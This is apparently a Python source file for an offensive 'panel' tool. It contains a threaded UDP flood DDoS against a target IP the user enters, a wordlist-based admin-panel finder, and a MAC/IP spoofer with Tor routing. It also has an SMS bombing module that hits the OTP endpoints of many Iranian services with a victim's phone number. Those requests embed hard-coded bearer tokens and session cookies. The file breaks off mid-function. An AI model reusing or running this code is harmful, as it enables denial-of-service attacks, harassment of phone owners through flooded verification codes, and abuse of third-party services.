import os, sys, socket, subprocess , wmi , requests , random , colorama , time  , threading  , socks , time
from colorama import init , Fore
from re import match, sub
from threading import Thread, active_count
from time import sleep
from requests import post , get
init(autoreset=True)
selection = 0
c = wmi.WMI()
#------------------------------------------
def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)  
        return True
    except socket.error:
        return False
def generate_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

def ping_target(target):
    try:
        while True:
            response = subprocess.run(
                ["ping", "-n", "1", target], stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            if response.returncode == 0:
                print(f"{Fore.GREEN}Ping to {target} successful!{Fore.RESET}", end='\r')
            else:
                print(f"{Fore.RED}Ping to {target} failed!{Fore.RESET}", end='\r')
            time.sleep(1)  
    except Exception as e:
        print(f"{Fore.RED}Error in pinging target: {e}{Fore.RESET}", end='\r')

def attack(target, port, fake_ip, packet_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
        s.settimeout(1)
        packet = random._urandom(1024)
        for i in range(packet_count):  
            s.sendto(packet, (target, port))
            print(f"{Fore.GREEN}Packets sent: {i+1}/{packet_count}{Fore.RESET}", end='\r')
        
        s.close()
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Fore.RESET}", end='\r')

def Attack(target):
    packet_count = int(input(f"{Fore.GREEN}Enter Attack Count > {Fore.RESET}"))
    threads = []
    ping_thread = threading.Thread(target=ping_target, args=(target,))
    ping_thread.daemon = True  
    ping_thread.start()

    for _ in range(packet_count):  
        fake_ip = generate_ip()
        thread = threading.Thread(target=attack, args=(target, 80, fake_ip, packet_count))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

    print(f"{Fore.RED}DDos Finished{Fore.RESET}")
    time.sleep(3)
    os.system("cls")

def DDOS():
    texts = f"""
{Fore.CYAN}

██████╗░██████╗░░█████╗░░██████╗  ██████╗░░█████╗░███╗░░██╗███████╗██╗░░░░░
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗██╔══██╗████╗░██║██╔════╝██║░░░░░
██║░░██║██║░░██║██║░░██║╚█████╗░  ██████╔╝███████║██╔██╗██║█████╗░░██║░░░░░
██║░░██║██║░░██║██║░░██║░╚═══██╗  ██╔═══╝░██╔══██║██║╚████║██╔══╝░░██║░░░░░
██████╔╝██████╔╝╚█████╔╝██████╔╝  ██║░░░░░██║░░██║██║░╚███║███████╗███████╗
╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚══════╝                                                     

{Fore.RED}> {Fore.WHITE} Version 1.0
{Fore.RED}> {Fore.WHITE} Created By NewFolder
"""
    os.system("cls")
    time.sleep(2)
    print(texts)

    ip_domain = input(f"{Fore.GREEN}Enter Target IP > {Fore.RESET}")

    if ip_domain:
        Attack(ip_domain)
    else:
        print(f"{Fore.RED}[Error] > {Fore.WHITE} Invalid IP Address")
        time.sleep(3)
        os.system("cls")
        DDOS()
#----------------------
def admin_finder():
    texts = f""" 
    {Fore.CYAN}

░█████╗░██████╗░███╗░░░███╗██╗███╗░░██╗  ███████╗██╗███╗░░██╗██████╗░███████╗██████╗░
██╔══██╗██╔══██╗████╗░████║██║████╗░██║  ██╔════╝██║████╗░██║██╔══██╗██╔════╝██╔══██╗
███████║██║░░██║██╔████╔██║██║██╔██╗██║  █████╗░░██║██╔██╗██║██║░░██║█████╗░░██████╔╝
██╔══██║██║░░██║██║╚██╔╝██║██║██║╚████║  ██╔══╝░░██║██║╚████║██║░░██║██╔══╝░░██╔══██╗
██║░░██║██████╔╝██║░╚═╝░██║██║██║░╚███║  ██║░░░░░██║██║░╚███║██████╔╝███████╗██║░░██║
╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝  ╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝

{Fore.RED}> {Fore.WHITE} Version 1.0
{Fore.RED}> {Fore.WHITE} Created By NewFolder
"""
    os.system("cls")
    time.sleep(2)
    print(texts)
    url = input(f"{Fore.GREEN} Enter Url > {Fore.RESET}")
    url = "http://"+url
    wordlist = input(f"{Fore.GREEN} Enter WordList > {Fore.RESET}")
    wordlist = open(wordlist,"r").read().splitlines()
    for urls in wordlist:
        full_addres = url+"/"+urls
        response = requests.get(full_addres)
        if response.status_code == 200 :
            print(f"{Fore.GREEN} Admin Panel Found ===> {full_addres} {Fore.RESET}")
        else:
          print(f"{Fore.RED} Admin Panel Not Found ===> {full_addres} {Fore.RESET}")  
    print(f"{Fore.YELLOW}Search completed. Exiting now...{Fore.RESET}")
    time.sleep(2)
    os.system("cls")
    startup()
#-----------------------
def generate_random_mac():
    return "02-%02x-%02x-%02x-%02x-%02x-%02x" % tuple(random.randint(0, 255) for _ in range(6))
def is_valid_interface(interface):
    interfaces = os.popen("netsh interface show interface").read()
    return interface in interfaces
def change_mac(interface):
    new_mac = generate_random_mac()
    print(f"{Fore.GREEN}{interface} Changed To > {Fore.RESET} {new_mac}")

    command = f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4d36e972-e325-11ce-bfc1-08002be10318}}\\0001" /v NetworkAddress /t REG_SZ /d {new_mac.replace("-", "")} /f'
    os.system(command)
    os.system(f'netsh interface set interface "{interface}" admin=disable')
    time.sleep(2)
    os.system(f'netsh interface set interface "{interface}" admin=enable')

    print(f"{Fore.GREEN} New Mac-Adress > {Fore.RESET}{new_mac}")
    return new_mac

def generate_random_ip():
    return f"192.168.1.{random.randint(100, 250)}"

def change_ip(interface):
    new_ip = generate_random_ip()
    subnet_mask = "255.255.255.0"
    gateway = "192.168.1.1"

    print(f"{Fore.GREEN}{interface} Changed To > {Fore.RESET} {new_ip}")
    os.system(f'netsh interface ip set address name="{interface}" static {new_ip} {subnet_mask} {gateway}')
    print(f"{Fore.GREEN}New Ip > {Fore.RESET} {new_ip}")

    return new_ip

def change_public_ip():
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket

    try:
        ip = requests.get("http://checkip.amazonaws.com").text.strip()
        print(f"{Fore.GREEN} New Ip Public > {Fore.RESET} {ip}")
        return ip
    except:
        print(f"{Fore.RED} [Error] > {Fore.RESET}Make Sure The Tor Is Running.")
        return None

def spoofer():
    texts = f"""

░██████╗██████╗░░█████╗░░█████╗░███████╗███████╗██████╗░
██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
╚█████╗░██████╔╝██║░░██║██║░░██║█████╗░░█████╗░░██████╔╝
░╚═══██╗██╔═══╝░██║░░██║██║░░██║██╔══╝░░██╔══╝░░██╔══██╗
██████╔╝██║░░░░░╚█████╔╝╚█████╔╝██║░░░░░███████╗██║░░██║
╚═════╝░╚═╝░░░░░░╚════╝░░╚════╝░╚═╝░░░░░╚══════╝╚═╝░░╚═╝
    {Fore.RED}> {Fore.WHITE} Version 1.0
    {Fore.RED}> {Fore.WHITE} Created By NewFolder
    {Fore.RED}>  [1] : {Fore.RESET} Spoof Mac-Adress , Local Ip
    {Fore.RED}>  [2] : {Fore.RESET} Spoof Public Ip
    {Fore.RED}>  [3] : {Fore.RESET} Exit 
"""
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(texts)
        choice = input(f"{Fore.GREEN}Enter The Number >  {Fore.RESET}").strip()
        interface = input(f"{Fore.GREEN} Enter The Network Device Name > {Fore.RESET}").strip()
        while not is_valid_interface(interface):
            print(f"{Fore.RED}[Error] > {Fore.RESET} Device Incorrect")
            interface = input(f"{Fore.GREEN} Enter The Network Device Name > {Fore.RESET}").strip()
        if choice == "1":
            new_mac = change_mac(interface)
            new_ip = change_ip(interface)
        elif choice == "2":
            change_public_ip()
        elif choice == "3":
            os.system("cls")
            time.sleep(2)
            startup()
        else:
            print(f"{Fore.RED}[Error] > {Fore.WHITE} Value Incorrect {Fore.RESET}")
            print(f"{Fore.BLUE}[Information] > {Fore.WHITE} Reset In 3 Sec..")
            os.system("cls")
            time.sleep(3)
            spoofer()
#------------------------
def snap(phone):
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":phone}
    try:
        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
        if "OK" in snapR:
            print(f'{g}(Snap) {w}Code Was Sent')
            return True #snapp
    except:
        pass
def gap(phone):
    gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
    try:
        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH).text
        if "OK" in gapR:
            print(f'{g}(Gap) {w}Code Was Sent')
            return True #gap
        
    except:
        pass
def tap30(phone):
    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        tap30R = post(timeout=5, url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D).json()
        if tap30R['result'] == "OK":
            print(f'{g}(Tap30) {w}Code Was Sent')
            return True #tapsi
    except:
        pass
    
def divar(phone):
    divarH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://divar.ir',
'referer': 'https://divar.ir/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'x-standard-divar-error': 'true'}
    divarD = {"phone":phone.split("+98")[1]}
    try:
        divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
        if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f'{g}(Divar) {w}Code Was Sent')
            return True #divar api
    except:
        pass
    
def torob(phone):
    phone = '0'+phone.split('+98')[1]
    torobH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cookie': 'abtest=next_pwa; search_session=ofwjiyqqethomevqrgzxvopjtgkgimdc; _gcl_au=1.1.805505755.1639260830; _gid=GA1.2.683761449.1639260830; _gat_UA-105982196-1=1; _ga_CF4KGKM3PG=GS1.1.1639260830.1.0.1639260830.0; _clck=130ifw1|1|ex6|0; _ga=GA1.2.30224238.1639260830',
'origin': 'https://torob.com',
'referer': 'https://torob.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        torobR = get(timeout=5, url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", headers=torobH).json()
        if torobR["message"] == "pin code sent":
            print(f'{g}(Torob) {w}Code Was Sent')
            return True # torob
    except:
        pass

def snapfood(phone):
    sfoodU = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa'
    sfoodH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'UUID=39c62f64-3d2d-4954-9033-816098559ae4; location={"id":"","latitude":"-1.000","longitude":"-1.000","mode":"Auto"}; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BRQfjyp1DGE7w6o2UXNZHyc7XXXwZB6%2B4%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FKNDbZLoR2s9fxetSEbovoXrW2OyagTvcRyyfS%2BiAq3Wo0gtPlB2mt5jezOT0RcCuwOIS0v8tUKw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2Bxvj2aS9mFuxvX6rDEMIsAuRecCyMypTk%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2B8so%2F5rMdojUEEuG%2BVwFrtXzXNtpojE10%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2FUIoTuPIMvAKRiGcEmnsfog8TvprQ8QJI%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FOaB1OTIgZSuGfv6Ov271AcX0ZKQWg94ey1fyJ%2Fv%2B2H09dia3Z%2BMvi; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19W4bPJRR7lbNo2fIWRB3Gk2GDkBYASrB7u755JxTnymjQ4j%2BjxgRx0; jwt-refresh_token=undefined; jwt-token_type=Bearer; jwt-expires_in=2678399; jwt-access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ; crisp-client%2Fsession%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=session_69ff5918-b549-4c78-89fd-b851ca35bdf6; crisp-client%2Fsocket%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=0',
'origin': 'https://snappfood.ir',
'referer': 'https://snappfood.ir/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    sfoodD = {"cellphone": "0"+phone.split("+98")[1]}
    try:
        sfoodR = post(timeout=5, url=sfoodU, headers=sfoodH, data=sfoodD).json()
        if sfoodR['status'] == True:
            print(f'{g}(SnapFood) {w}Code Was Sent')
            return True # snapp food
    except:
        pass

def alibaba(phone):
    alibabaH = {"Host": "ws.alibaba.ir","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR","ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy","Content-Type": "application/json;charset=utf-8","Content-Length": "29","Origin": "https://www.alibaba.ir","Connection": "keep-alive","Referer": "https://www.alibaba.ir/hotel"}
    alibabaD = {"phoneNumber":"0"+phone.split("+98")[1]}
    try:
        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD ).json()
        if alibabaR["result"]["success"] == True:
            print(f'{g}(AliBaba) {w}Code Was Sent')
            return True
    except:
        pass

def smarket(phone):
    smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+98")[1]}'
    smarketH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'text/plain;charset=UTF-8',
'origin': 'https://snapp.market',
'referer': 'https://snapp.market/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        smarketR = post(timeout=5, url=smarketU, headers=smarketH).json()
        if smarketR['status'] == True:
            print(f'{g}(SnapMarket) {w}Code Was Sent')
            return True #SnapMarket
    except:
        pass
def seebirani(phone):
    liJ = {
    "username": "0"+phone.split('+98')[1]
}
    liU = "https://sandbox.sibirani.ir/api/v1/user/invite"
    liH = {'accept': 'application/json',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json',
'origin': 'https://developer.sibirani.com',
'referer': 'https://developer.sibirani.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        post(timeout=5, url=liU, headers=liH, json=liJ)
        print(f'{g}(SeebIrani) {w}Code Was Sent')
        return True
    except:
        pass
def mihanpezeshk(phone):
